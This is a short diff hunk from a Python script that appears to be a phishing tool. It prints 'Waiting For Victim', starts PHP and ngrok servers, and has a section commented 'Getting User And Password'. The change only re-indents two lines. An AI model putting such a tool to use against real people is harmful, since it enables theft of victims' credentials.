@@ -561,8 +561,8 @@ exit();""")
       print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
     elif v == "02":
        phpserver ()
-       ngrokserver()
-       print(a)
+   ngrokserver()
+   print(a)
  # Getting User And Password
     def userin():
         global stat_file
